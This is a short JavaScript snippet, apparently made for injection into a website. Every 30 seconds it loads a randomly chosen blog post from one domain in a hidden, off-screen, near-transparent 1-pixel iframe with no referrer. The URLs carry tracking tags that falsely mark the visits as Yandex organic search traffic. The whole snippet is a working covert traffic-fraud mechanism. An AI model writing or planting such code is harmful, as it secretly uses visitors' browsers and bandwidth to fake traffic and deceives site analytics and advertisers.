  const urls = [
    "https://www.ultrapeak.online/2024/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_11.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_85.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_68.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_0.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_38.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_33.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_23.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.ultrapeak.online/2024/09/blog-post_91.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
